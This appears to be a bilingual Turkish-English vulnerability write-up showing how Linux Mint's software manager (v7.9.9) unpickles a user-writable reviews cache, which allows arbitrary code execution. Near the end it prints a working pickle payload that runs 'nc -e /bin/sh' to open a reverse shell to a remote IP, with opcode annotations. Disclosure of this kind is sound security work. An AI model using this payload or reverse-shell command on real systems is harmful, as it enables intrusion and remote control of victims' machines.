[TR] Linux mint yazılım yöneticisi (v 7.9.9) yanlış yapılandırmadan dolayı obje enjeksiyonu ve keyfi kod çalıştırmamıza neden olmaktadır.

[EN] Linux mint software manager (v 7.9.9) causes us to execute object injection and arbitrary code due to incorrect configuration


	mintinsall

[TR] Mint yazılım yöneticisini çalıştırdıgımız da yeni yorum olup olmadıgını kontrol ediyor eger yeni yorum varsa  [new-reviews.list](https://community.linuxmint.com/data/) adresinden indirip dosyaya yazıyor.

[EN] If there is a new comment [new-reviews.list](https://community.linuxmint.com/data/) download from and write to file.

![](imgs/20190926-164424.png)

	code mintinstall.py
	
[TR] Yazılım yöneticisini ilk başladıgında , reviews modülünden ReviewCache() sınıfını çağırıyor.

[EN] When the software manager first starts, it calls the ReviewCache() class from the reviews module.
 
 ![](imgs/20190926-170607.png)
 
# Verileri Nasıl İşliyor?
# How Does It Process Data?

	code reviews.py
	
[TR] ReviewCache sınıfı başladıgında(__init__)  _load_cache() fonksiyonunu çagırıyor.

[EN] When the ReviewCache class starts (__init__) it calls _load_cache()

![](imgs/20190926-171334.png)

[TR] Load cache fonksiyonu REVIEWS_CACHE degişkeninde olan dosyayı okuyup pickle modülü yardımıyla dosyanın içinde ki datayı unserialize ediyor ve bazı değerleri hafıza da tutuyor.

[EN] The Load cache function reads the file in the REVIEWS_CACHE variable and unserializes the data in the file with the help of the pickle module and holds some values in memory.


![](imgs/20190926-171938.png)
![](imgs/20190926-165833.png)
![](imgs/20190926-165855.png)

[TR] Dosyayı kontrol ettigimde yazma iznim oldugu görünüyor.

[EN] When I check the file, it looks like I'm allowed to write.

 ![](imgs/20190926-170651.png)

[TR] [Pickle](https://docs.python.org/3.6/library/pickle.html) modülü yardımıyla serialize/unserialize işlemleri gerçekleştirebildigimizden, reduce metodu kullanarak modül dahil edip keyfi kod yürütebiliriz.

[EN] [Pickle](https://docs.python.org/3.6/library/pickle.html) since we can perform serialize/unserialize operations with the module, we can include the module and execute arbitrary code using the reduce method.

![](imgs/20190927-113447.png)

[TR] Bu durumda eğer dosya unserialize edilmeye çalışılırsa zararlı kodumuz çalışacaktır.

[EN] If you attempt to unserialize the file, our malicious code will work.

	cos 
	system 
	(S'nc -e /bin/sh 192.168.2.138 4545' 
	tR.
	>>modül adı c{os}
	>> fonksiyon
	( >> işaretleyici nesnesi 
	S >> tırnak sonuna kadar okuyup stack'e at
	tR. >> stackte olanları çagır ve sonucu stacke yerleştir.
	
![](imgs/20190927-131940.png)



![alt-text](imgs/exploit.gif)
